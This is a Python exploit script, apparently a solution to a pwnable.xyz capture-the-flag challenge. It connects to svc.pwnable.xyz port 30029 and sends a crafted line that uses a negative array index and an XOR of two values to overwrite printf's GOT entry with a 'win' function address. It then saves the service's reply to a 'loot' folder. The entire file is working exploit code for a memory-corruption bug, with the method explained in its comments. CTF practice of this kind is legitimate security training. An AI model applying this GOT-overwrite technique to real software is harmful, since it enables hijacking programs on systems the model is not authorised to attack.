#!/usr/bin/env python3
import socket
import sys
from pathlib import Path


def send_and_recv(host: str, port: int, timeout_s: float, payload: bytes) -> bytes:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout_s)
    try:
        sock.connect((host, port))
        # Try to read any initial banner without blocking too long
        try:
            _ = sock.recv(4096)
        except socket.timeout:
            pass
        sock.sendall(payload)
        sock.shutdown(socket.SHUT_WR)
        chunks: list[bytes] = []
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)
    finally:
        sock.close()


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else "svc.pwnable.xyz"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 30029
    timeout_s = float(sys.argv[3]) if len(sys.argv) > 3 else 10.0

    # Target: overwrite printf@GOT with win address via negative index into result
    # Addresses from binary metadata (PIE offsets/absolute for sections)
    result_addr = 0x0000000000202200
    printf_got = 0x0000000000201FA0
    win_addr = 0x0000000000000A21

    # Compute negative index (signed) into result array
    byte_delta = printf_got - result_addr  # negative
    if byte_delta % 8 != 0:
        raise RuntimeError("Unaligned target; expected 8-byte alignment")
    index = byte_delta // 8  # negative index

    # Build values so that a ^ b == win_addr and both are non-zero
    xor_mask = 1
    a_val = win_addr ^ xor_mask
    b_val = xor_mask

    line = f"{a_val} {b_val} {index}\n".encode()

    data = send_and_recv(host, port, timeout_s, line)

    loot_dir = Path(__file__).resolve().parent.parent / "loot"
    loot_dir.mkdir(parents=True, exist_ok=True)
    out_file = loot_dir / "remote_output.txt"
    out_file.write_bytes(data)
    sys.stdout.buffer.write(data)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

